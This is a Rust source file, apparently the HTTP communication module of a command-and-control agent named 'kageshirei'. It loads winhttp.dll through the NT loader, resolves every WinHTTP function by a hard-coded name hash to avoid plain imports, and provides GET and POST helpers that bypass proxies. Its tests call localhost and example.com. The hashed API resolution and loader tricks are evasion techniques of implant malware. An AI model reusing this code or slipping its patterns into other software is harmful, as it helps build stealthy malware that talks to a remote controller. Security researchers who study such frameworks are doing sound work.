use alloc::{borrow::ToOwned as _, format, string::String, vec::Vec};
use core::{
    ffi::c_void,
    ptr::{null, null_mut},
    sync::atomic::{AtomicBool, Ordering},
};

use kageshirei_win32::{
    ntdef::UnicodeString,
    winhttp::{
        WinHttp,
        WinHttpAddRequestHeadersFunc,
        WinHttpCloseHandleFunc,
        WinHttpConnectFunc,
        WinHttpError,
        WinHttpGetIEProxyConfigForCurrentUserFunc,
        WinHttpGetProxyForUrlFunc,
        WinHttpOpenFunc,
        WinHttpOpenRequestFunc,
        WinHttpQueryHeadersFunc,
        WinHttpReadDataFunc,
        WinHttpReceiveResponseFunc,
        WinHttpSendRequestFunc,
        WinHttpSetOptionFunc,
        HTTP_QUERY_STATUS_CODE,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE,
        WINHTTP_FLAG_SECURE,
        WINHTTP_QUERY_FLAG_NUMBER,
    },
};
use mod_agentcore::{instance, ldr::nt_get_last_error, resolve_direct_syscalls};

use crate::utils::{parse_url, to_pcwstr};

/// Global variable to store WinHTTP functions
static mut WINHTTP_FUNCS: Option<WinHttp> = None;
/// Atomic variable to track if WinHTTP functions have been initialized
static INIT_WINHTTP: AtomicBool = AtomicBool::new(false);

/// Initializes WinHTTP functions.
///
/// This function dynamically loads the WinHTTP functions from the "winhttp.dll" library.
/// It ensures that the functions are loaded only once using atomic operations.
/// The function does not return any values.
fn init_winhttp_funcs() {
    unsafe {
        if !INIT_WINHTTP.load(Ordering::Acquire) {
            let dll_name = "winhttp.dll";
            let mut winhttp_dll_unicode = UnicodeString::new();
            let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect();
            winhttp_dll_unicode.init(utf16_string.as_ptr());

            let mut winhttp_handle: *mut c_void = null_mut();

            if let Some(ldr_load_dll) = instance().ntdll.ldr_load_dll {
                // Load the DLL using the Windows NT Loader
                ldr_load_dll(
                    null_mut(),
                    null_mut(),
                    winhttp_dll_unicode,
                    &mut winhttp_handle as *mut _ as *mut c_void,
                );
            }

            if winhttp_handle.is_null() {
                return;
            }

            let h_module = winhttp_handle as *mut u8;

            if h_module.is_null() {
                return;
            }

            let mut winhttp_functions = WinHttp::new();

            resolve_direct_syscalls!(
                h_module,
                [
                    (winhttp_functions.win_http_open, 0x613eace5, WinHttpOpenFunc),
                    (
                        winhttp_functions.win_http_connect,
                        0x81e0c81d,
                        WinHttpConnectFunc
                    ),
                    (
                        winhttp_functions.win_http_open_request,
                        0xb06d900e,
                        WinHttpOpenRequestFunc
                    ),
                    (
                        winhttp_functions.win_http_set_option,
                        0x5b6ad378,
                        WinHttpSetOptionFunc
                    ),
                    (
                        winhttp_functions.win_http_close_handle,
                        0xa7355f15,
                        WinHttpCloseHandleFunc
                    ),
                    (
                        winhttp_functions.win_http_send_request,
                        0x7739d0e6,
                        WinHttpSendRequestFunc
                    ),
                    (
                        winhttp_functions.win_http_add_request_headers,
                        0xa2c0b0e1,
                        WinHttpAddRequestHeadersFunc
                    ),
                    (
                        winhttp_functions.win_http_receive_response,
                        0xae351ae5,
                        WinHttpReceiveResponseFunc
                    ),
                    (
                        winhttp_functions.win_http_read_data,
                        0x75064b89,
                        WinHttpReadDataFunc
                    ),
                    (
                        winhttp_functions.win_http_query_headers,
                        0xcc1a89c5,
                        WinHttpQueryHeadersFunc
                    ),
                    (
                        winhttp_functions.win_http_get_ie_proxy_config_for_current_user,
                        0x028197a2,
                        WinHttpGetIEProxyConfigForCurrentUserFunc
                    ),
                    (
                        winhttp_functions.win_http_get_proxy_for_url,
                        0xa2cf3c6f,
                        WinHttpGetProxyForUrlFunc
                    )
                ]
            );

            // Store the functions in the global variable
            WINHTTP_FUNCS = Some(winhttp_functions);

            // Mark WinHTTP functions as initialized
            INIT_WINHTTP.store(true, Ordering::Release);
        }
    }
}

/// Gets the WinHTTP functions.
///
/// This function ensures the WinHTTP functions are initialized and returns a reference to them.
/// If the functions are not already initialized, it will initialize them first.
///
/// # Returns
/// * `&'static WinHttp` - A reference to the initialized WinHTTP functions.
#[expect(
    static_mut_refs,
    reason = "Access to mutable static data is protected by a RwLock, ensuring shared references are safe and \
              preventing data races."
)]
pub fn get_winhttp() -> &'static WinHttp {
    init_winhttp_funcs();
    unsafe { WINHTTP_FUNCS.as_ref().unwrap() }
}

/// Represents an HTTP response.
pub struct Response {
    /// The status code of the HTTP response.
    pub status_code: u32,
    /// The body of the HTTP response as a string.
    pub body:        String,
}

/// Reads the response from an HTTP request.
///
/// This function reads the response from the specified HTTP request handle and
/// returns a `Result` containing the response or an error message if the operation failed.
///
/// # Arguments
/// * `h_request` - The HTTP request handle.
///
/// # Safety
/// This function is unsafe because it dereferences a raw pointer.
///
/// # Returns
/// * `Ok(Response)` with the response if the operation was successful.
/// * `Err(String)` if there was an error during the read operation, with the error message.
pub unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> {
    let mut status_code: u32 = 0;
    let mut status_code_len: u32 = core::mem::size_of::<u32>() as u32;

    if let Some(win_http_query_headers) = get_winhttp().win_http_query_headers {
        let b_status_code = win_http_query_headers(
            h_request,
            HTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            null(),
            &mut status_code as *mut _ as *mut _,
            &mut status_code_len,
            null_mut(),
        );
        if b_status_code == 0 {
            let error = nt_get_last_error();
            return Err(format!(
                "WinHttpQueryHeaders failed with error: {}",
                WinHttpError::from_code(error as i32)
            ));
        }
    }
    else {
        return Err(("WinHttpQueryHeaders failed with error: {}").to_owned());
    }

    let mut buffer: [u8; 4096] = [0; 4096];
    let mut bytes_read: u32 = 0;
    let mut response_body = String::new();

    if let Some(win_http_read_data) = get_winhttp().win_http_read_data {
        loop {
            let b_result = win_http_read_data(
                h_request,
                buffer.as_mut_ptr() as *mut _,
                buffer.len() as u32,
                &mut bytes_read,
            );
            if b_result == 0 || bytes_read == 0 {
                break;
            }
            response_body.push_str(&String::from_utf8_lossy(
                buffer.get(.. bytes_read as usize).unwrap(),
            ));
        }
    }
    else {
        return Err("win_http_read_data function is not available".to_owned());
    }

    Ok(Response {
        status_code,
        body: response_body,
    })
}

/// Performs an HTTP GET request.
///
/// This function performs an HTTP GET request to the specified URL and path. It
/// supports both HTTP and HTTPS protocols. It returns a `Result` containing the
/// response or an error message if the operation failed.
///
/// # Arguments
/// * `url` - The server URL.
/// * `path` - The request path.
///
/// # Returns
/// * `Ok(Response)` with the response if the operation was successful.
/// * `Err(String)` if there was an error during the request, with the error message.
pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
    unsafe {
        if let Some(win_http_open) = get_winhttp().win_http_open {
            let h_session = win_http_open(
                to_pcwstr("RustWinHttp").as_ptr(),
                WINHTTP_ACCESS_TYPE_NO_PROXY,
                null(),
                null(),
                0,
            );
            if h_session.is_null() {
                let error = nt_get_last_error();
                return Err(format!(
                    "WinHttpOpen failed with error: {}",
                    WinHttpError::from_code(error as i32)
                ));
            }

            let parsed_url = parse_url(url);
            let secure_flag = if parsed_url.scheme == 0x02 {
                WINHTTP_FLAG_SECURE
            }
            else {
                0
            };

            if let Some(win_http_connect) = get_winhttp().win_http_connect {
                let h_connect = win_http_connect(
                    h_session,
                    to_pcwstr(parsed_url.hostname.as_str()).as_ptr(),
                    parsed_url.port,
                    0,
                );
                if h_connect.is_null() {
                    let error = nt_get_last_error();
                    if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                        win_http_close_handle(h_session);
                    }
                    return Err(format!(
                        "WinHttpConnect failed with error: {}",
                        WinHttpError::from_code(error as i32)
                    ));
                }

                if let Some(win_http_open_request) = get_winhttp().win_http_open_request {
                    let h_request = win_http_open_request(
                        h_connect,
                        to_pcwstr("GET").as_ptr(),
                        to_pcwstr(path).as_ptr(),
                        null(),
                        null(),
                        null(),
                        WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
                    );
                    if h_request.is_null() {
                        let error = nt_get_last_error();
                        if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                            win_http_close_handle(h_connect);
                            win_http_close_handle(h_session);
                        }
                        return Err(format!(
                            "WinHttpOpenRequest failed with error: {}",
                            WinHttpError::from_code(error as i32)
                        ));
                    }

                    if let Some(win_http_send_request) = get_winhttp().win_http_send_request {
                        let b_request_sent = win_http_send_request(h_request, null(), 0, null(), 0, 0, 0);
                        if b_request_sent == 0 {
                            let error = nt_get_last_error();
                            if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                                win_http_close_handle(h_request);
                                win_http_close_handle(h_connect);
                                win_http_close_handle(h_session);
                            }
                            return Err(format!(
                                "WinHttpSendRequest failed with error: {}",
                                WinHttpError::from_code(error as i32)
                            ));
                        }
                    }

                    if let Some(win_http_receive_response) = get_winhttp().win_http_receive_response {
                        let b_response_received = win_http_receive_response(h_request, null_mut());
                        if b_response_received == 0 {
                            let error = nt_get_last_error();
                            if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                                win_http_close_handle(h_request);
                                win_http_close_handle(h_connect);
                                win_http_close_handle(h_session);
                            }
                            return Err(format!(
                                "WinHttpReceiveResponse failed with error: {}",
                                WinHttpError::from_code(error as i32)
                            ));
                        }
                    }

                    let response = read_response(h_request)?;

                    if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                        win_http_close_handle(h_request);
                        win_http_close_handle(h_connect);
                        win_http_close_handle(h_session);
                    }

                    return Ok(response);
                }
            }
        }

        Err("WinHttp functions are not available".to_owned())
    }
}

/// Performs an HTTP POST request.
///
/// This function performs an HTTP POST request to the specified URL and path with
/// the given data. It supports both HTTP and HTTPS protocols. It returns a `Result`
/// containing the response or an error message if the operation failed.
///
/// # Arguments
/// * `url` - The server URL.
/// * `path` - The request path.
/// * `data` - The data to send in the POST request.
/// * `secure_flag` - The flag indicating whether HTTPS should be used.
///
/// # Returns
/// * `Ok(Response)` with the response if the operation was successful.
/// * `Err(String)` if there was an error during the request, with the error message.
pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
    unsafe {
        if let Some(win_http_open) = get_winhttp().win_http_open {
            let h_session = win_http_open(
                to_pcwstr("RustWinHttp").as_ptr(),
                WINHTTP_ACCESS_TYPE_NO_PROXY,
                null(),
                null(),
                0,
            );
            if h_session.is_null() {
                let error = nt_get_last_error();
                return Err(format!(
                    "WinHttpOpen failed with error: {}",
                    WinHttpError::from_code(error as i32)
                ));
            }

            let parsed_url = parse_url(url);
            let secure_flag = if parsed_url.scheme == 0x02 {
                WINHTTP_FLAG_SECURE
            }
            else {
                0
            };

            if let Some(win_http_connect) = get_winhttp().win_http_connect {
                let h_connect = win_http_connect(
                    h_session,
                    to_pcwstr(parsed_url.hostname.as_str()).as_ptr(),
                    parsed_url.port,
                    0,
                );
                if h_connect.is_null() {
                    let error = nt_get_last_error();
                    if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                        win_http_close_handle(h_session);
                    }
                    return Err(format!(
                        "WinHttpConnect failed with error: {}",
                        WinHttpError::from_code(error as i32)
                    ));
                }

                if let Some(win_http_open_request) = get_winhttp().win_http_open_request {
                    let h_request = win_http_open_request(
                        h_connect,
                        to_pcwstr("POST").as_ptr(),
                        to_pcwstr(path).as_ptr(),
                        null(),
                        null(),
                        null(),
                        WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
                    );
                    if h_request.is_null() {
                        let error = nt_get_last_error();
                        if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                            win_http_close_handle(h_connect);
                            win_http_close_handle(h_session);
                        }
                        return Err(format!(
                            "WinHttpOpenRequest failed with error: {}",
                            WinHttpError::from_code(error as i32)
                        ));
                    }

                    if let Some(win_http_send_request) = get_winhttp().win_http_send_request {
                        let b_request_sent = win_http_send_request(
                            h_request,
                            null(),
                            0,
                            data.as_ptr() as *const _,
                            data.len() as u32,
                            data.len() as u32,
                            0,
                        );
                        if b_request_sent == 0 {
                            let error = nt_get_last_error();
                            if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                                win_http_close_handle(h_request);
                                win_http_close_handle(h_connect);
                                win_http_close_handle(h_session);
                            }
                            return Err(format!(
                                "WinHttpSendRequest failed with error: {}",
                                WinHttpError::from_code(error as i32)
                            ));
                        }
                    }

                    if let Some(win_http_receive_response) = get_winhttp().win_http_receive_response {
                        let b_response_received = win_http_receive_response(h_request, null_mut());
                        if b_response_received == 0 {
                            let error = nt_get_last_error();
                            if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                                win_http_close_handle(h_request);
                                win_http_close_handle(h_connect);
                                win_http_close_handle(h_session);
                            }
                            return Err(format!(
                                "WinHttpReceiveResponse failed with error: {}",
                                WinHttpError::from_code(error as i32)
                            ));
                        }
                    }

                    let response = read_response(h_request)?;

                    if let Some(win_http_close_handle) = get_winhttp().win_http_close_handle {
                        win_http_close_handle(h_request);
                        win_http_close_handle(h_connect);
                        win_http_close_handle(h_session);
                    }

                    return Ok(response);
                }
            }
        }

        Err("WinHttp functions are not available".to_owned())
    }
}

#[cfg(test)]
mod tests {
    use libc_print::libc_println;

    use super::*;

    #[test]
    fn test_http_get() {
        // Test HTTP GET request
        match http_get("http://localhost", "/") {
            Ok(response) => {
                libc_println!("HTTP GET request successful!");
                libc_println!("Status Code: {}", response.status_code);
                libc_println!("Response Body: {}", response.body);
            },
            Err(e) => libc_println!("HTTP GET request failed: {}", e),
        }

        // Test HTTPS GET request
        match http_get("https://example.com", "/") {
            Ok(response) => {
                libc_println!("HTTPS GET request successful!");
                libc_println!("Status Code: {}", response.status_code);
                libc_println!("Response Body: {}", response.body);
            },
            Err(e) => libc_println!("HTTPS GET request failed: {}", e),
        }
    }

    #[test]
    fn test_http_post() {
        // Test HTTP POST request
        match http_post("localhost", "/", "key=value") {
            Ok(response) => {
                libc_println!("HTTP POST request successful!");
                libc_println!("Status Code: {}", response.status_code);
                libc_println!("Response Body: {}", response.body);
            },
            Err(e) => libc_println!("HTTP POST request failed: {}", e),
        }

        // Test HTTPS POST request
        match http_post("https://example.com", "/", "key=value") {
            Ok(response) => {
                libc_println!("HTTPS POST request successful!");
                libc_println!("Status Code: {}", response.status_code);
                libc_println!("Response Body: {}", response.body);
            },
            Err(e) => libc_println!("HTTPS POST request failed: {}", e),
        }
    }
}
